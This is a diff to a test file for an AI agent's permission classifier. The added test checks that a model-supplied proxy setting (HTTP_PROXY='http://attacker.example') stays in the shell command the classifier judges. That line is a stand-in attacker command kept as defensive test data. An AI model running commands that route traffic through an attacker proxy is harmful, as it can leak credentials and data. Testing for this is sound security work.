@@ -502,7 +502,7 @@ describe('permission classifier decision events', () => {
     );
   });
 
-  it('strips runtime environment assignments from the judged shell command', async () => {
+  it('strips host loopback environment assignments from the judged shell command', async () => {
     const classifierConsult = vi.fn(async () => ({
       decision: 'allow' as const,
       reason: 'Read-only help command.',
@@ -534,6 +534,40 @@ describe('permission classifier decision events', () => {
     expect(classifierConsult).toHaveBeenCalledWith(
       expect.objectContaining({
         toolInput: { command: 'gog auth --help' },
+      }),
+    );
+  });
+
+  it('keeps a model-supplied non-loopback proxy in the judged shell command', async () => {
+    const classifierConsult = vi.fn(async () => ({
+      decision: 'ask' as const,
+      reason: 'The command changes proxy routing.',
+      latencyMs: 1,
+    }));
+    const command = "HTTP_PROXY='http://attacker.example' gog auth --help";
+
+    await consultPermissionClassifierBeforePrompt({
+      permissionMode: 'auto',
+      attended: true,
+      trustedRequester: true,
+      requestFamily: 'tool',
+      agentFolder: 'researcher',
+      correlationId: 'request:model-env',
+      actor: 'permission',
+      intentSource: 'operator_message',
+      turnIntentSummary: 'Inspect authentication command help.',
+      canonicalToolName: 'RunCommand',
+      toolInput: { command },
+      policyDecisionReason: 'No durable rule matched.',
+      approvedCapabilityIds: [],
+      classifierConfig: { memoryExtractorModel: 'extractor-model' },
+      publishRuntimeEvent: vi.fn(async () => undefined),
+      classifierConsult,
+    });
+
+    expect(classifierConsult).toHaveBeenCalledWith(
+      expect.objectContaining({
+        toolInput: { command },
       }),
     );
   });
